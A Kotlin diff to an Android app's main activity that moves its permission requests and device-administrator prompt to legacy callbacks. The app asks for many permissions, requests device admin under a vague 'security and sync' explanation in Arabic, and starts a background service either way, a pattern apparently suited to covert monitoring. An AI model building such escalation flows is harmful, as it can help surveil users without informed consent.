@@ -7,6 +7,7 @@ import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
 import android.media.MediaRecorder
 import android.net.Uri
@@ -25,8 +26,9 @@ import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -302,18 +304,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var devicePolicyManager: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
 
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissionsMap ->
-        requestDeviceAdminAndStartService()
-    }
-
-    private val adminLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { result ->
-        startBackgroundService()
-    }
-
     private val dynamicPermissions: Array<String>
         get() {
             val list = mutableListOf(
@@ -375,7 +365,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun requestAllPermissions() {
-        permissionLauncher.launch(dynamicPermissions)
+        ActivityCompat.requestPermissions(this, dynamicPermissions, 100)
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 100) {
+            requestDeviceAdminAndStartService()
+        }
     }
 
     private fun requestDeviceAdminAndStartService() {
@@ -384,8 +381,15 @@ class MainActivity : AppCompatActivity() {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                 putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة وإدارة النظام.")
             }
-            adminLauncher.launch(intent)
+            startActivityForResult(intent, 200)
         } else {
+            startBackgroundService()
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 200) {
             startBackgroundService()
         }
     }
